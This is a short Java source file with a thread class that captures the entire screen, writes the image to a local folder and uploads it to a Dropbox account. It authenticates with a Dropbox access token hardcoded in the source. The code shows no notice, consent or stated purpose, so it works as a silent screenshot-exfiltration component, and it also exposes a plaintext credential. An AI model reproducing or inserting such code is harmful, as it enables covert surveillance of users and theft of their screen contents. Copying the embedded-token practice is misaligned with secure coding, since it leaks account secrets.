import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class MyThread extends Thread {

    public void run() {
        try {
            pic();
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }

    private void pic() throws AWTException, IOException {

        String UUID1 = java.util.UUID.randomUUID() + ".png";
        String UUID2 = "/" + java.util.UUID.randomUUID() + ".png";

        String ACCESS_TOKEN = "vphYrsccPiAAAAAAAAAANJLr29d_Th7FtxyDLudrW5gIkCcoLBgsw_IeYqERRV6m";

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

        ImageIO.write(image
                , "png"
                , new File("src/main/resources/png/" + UUID1));

        try {
            InputStream in = new FileInputStream("src/main/resources/png/" + UUID1);
            client.files()
                    .uploadBuilder(UUID2)
                    .uploadAndFinish(in);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
